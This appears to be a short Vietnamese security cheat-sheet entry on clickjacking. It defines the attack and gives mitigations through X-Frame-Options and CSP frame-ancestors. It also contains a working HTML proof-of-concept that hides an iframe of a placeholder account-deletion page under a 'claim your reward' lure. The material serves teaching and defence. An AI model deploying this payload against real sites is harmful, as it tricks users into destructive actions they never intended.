# 🖱️ Clickjacking (UI Redressing)

## 1. 📌 Tổng quan
Clickjacking là kỹ thuật tấn công dựa trên giao diện người dùng, trong đó kẻ tấn công nhúng trang web mục tiêu vào một thẻ `<iframe>` trong suốt đặt đè lên một trang web giả mạo để lừa người dùng click vào các nút bấm quan trọng mà họ không hề hay biết.

---

## 2. 💣 Clickjacking PoC Template

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001; /* Ẩn iframe nhưng vẫn nhận click */
        z-index: 2;
    }
    div {
        position: absolute;
        top: 450px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click vào đây để nhận thưởng!</div>
<iframe src="https://vulnerable-website.com/account/delete"></iframe>
```

---

## 3. 🛡️ Biện pháp phòng chống (Mitigation)
1. **X-Frame-Options Header:**
   - `X-Frame-Options: DENY` (Không cho phép nhúng frame)
   - `X-Frame-Options: SAMEORIGIN` (Chỉ cho phép nhúng frame từ cùng domain)
2. **Content Security Policy (CSP):**
   - `Content-Security-Policy: frame-ancestors 'none';` hoặc `frame-ancestors 'self';`
